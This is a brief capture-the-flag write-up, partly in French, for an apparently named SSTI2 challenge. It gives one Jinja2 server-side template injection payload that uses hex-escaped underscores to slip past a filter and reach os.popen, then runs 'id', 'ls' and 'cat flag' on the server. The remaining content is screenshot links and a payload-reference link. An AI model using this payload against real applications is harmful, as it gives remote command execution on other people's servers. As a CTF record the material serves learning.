![1741668784139](images/SSTI2/1741668784139.png)

![1741668895079](images/SSTI2/1741668895079.png)

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

avec `id`

![1741669383003](images/SSTI2/1741669383003.png)

avec `ls`

![1741669452197](images/SSTI2/1741669452197.png)

avec `cat flag`

![1741669518233](images/SSTI2/1741669518233.png)
